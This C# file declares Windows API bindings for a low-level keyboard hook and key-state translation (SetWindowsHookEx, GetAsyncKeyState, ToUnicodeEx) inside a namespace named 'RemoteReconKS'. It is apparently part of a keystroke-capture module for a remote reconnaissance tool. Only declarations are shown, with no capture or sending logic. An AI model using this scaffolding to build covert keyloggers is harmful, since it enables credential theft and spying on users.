using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace RemoteReconKS
{
    public class WinApi
    {
        public const int WH_KEYBOARD_LL = 13;

        public const int WM_KEYDOWN = 0x0100;
        public const int WM_SYSKEYDOWN = 0x0104;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static LowLevelKeyboardProc _proc = RemoteReconKS.HookCallback;
        public static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32")]
        public static extern IntPtr GetKeyboardLayout(int dwLayout);

        [DllImport("user32.dll")]
        public static extern uint MapVirtualKeyEx(uint uCode, uint uMapType, IntPtr dwhkl);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        public static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool GetKeyboardState(byte[] lpKeyState);

        [DllImport("user32.dll")]
        public static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[]
           lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff,
           int cchBuff, uint wFlags, IntPtr dwhkl);
    }
}
